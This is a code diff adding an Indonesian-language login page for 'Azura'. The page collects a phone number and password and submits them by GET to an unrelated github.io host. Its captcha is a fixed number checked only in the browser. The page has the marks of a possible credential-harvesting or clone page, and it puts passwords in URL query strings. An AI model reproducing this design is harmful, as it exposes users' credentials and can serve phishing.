@@ -1,0 +1,164 @@
+<html lang="en">
+ <head> 
+  <meta charset="UTF-8"> 
+  <title>Login - Azura</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> 
+  <style>
+        body {
+            background: #000;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .form-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #363333;
+            margin-bottom: 30px;
+        }
+
+        .form-container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-item {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .form-item label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        .form-item input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .captcha-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .captcha-code {
+            font-size: 18px;
+            color: #333;
+            margin-left: 10px;
+        }
+
+        #togglePassword {
+            position: absolute;
+            right: 10px;
+            top: 35px;
+            color: #888;
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #128cff;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .login-link a {
+            color: #3b5bd5;
+            text-decoration: none;
+        }
+    </style> 
+ </head> 
+ <body style="background-color: #363333"> 
+  <div class="container"> 
+   <img src="q2.jpg" class="logo" alt="Logo"> 
+   <div class="form-title">
+         <b>Login Akun Lama.</b>
+   </div> 
+   <form action="https://dashboard-page.github.io/" method="GET" class="form-container" onsubmit="return validateCaptcha()"> 
+    <input type="hidden" name="_token" value="BXflOztPFym2lo7MRjHKxQXWAyxpSAP76krzhhSd"> 
+    <div class="form-item"> 
+     <label for="phone">Nomor Handphone</label> 
+     <input type="tel" id="phone" name="phone" placeholder="Masukkan nomor ponsel Anda" autocomplete="off" pattern="[0-9]*" inputmode="numeric" maxlength="15"> 
+    </div> 
+    <div class="form-item"> 
+     <label for="captcha">Captcha</label> 
+     <div class="captcha-container"> 
+      <input type="text" id="captcha" name="captcha" placeholder="Masukkan captcha" autocomplete="off" maxlength="4" pattern="[0-9]*" inputmode="numeric"> 
+      <button class="captcha-code">2598</span> 
+     </div> 
+    </div> 
+    <div class="form-item"> 
+     <label for="password">Kata Sandi</label> 
+     <input type="password" id="password" name="password" placeholder="Kata sandi (≥6 karakter)" autocomplete="off"> 
+     <i class="fa fa-eye" id="togglePassword"></i> 
+    </div> 
+    <button type="submit" class="submit-btn">Masuk</button> 
+    <div class="login-link">
+      Belum memiliki akun? 
+     <a href="index.html">Daftar sekarang</a> 
+    </div> 
+   </form> 
+  </div> 
+  <script>
+        var generatedCode = '2598';
+
+        function validateCaptcha() {
+            let captchaInput = document.getElementById('captcha').value;
+            if (captchaInput != generatedCode) {
+                alert('Kode captcha salah.');
+                return false;
+            }
+            return true;
+        }
+
+        // Toggle password visibility
+        const togglePassword = document.querySelector('#togglePassword');
+        const password = document.querySelector('#password');
+
+        togglePassword.addEventListener('click', function() {
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            this.classList.toggle('fa-eye-slash');
+        });
+    </script> 
+ </body>
+</html>
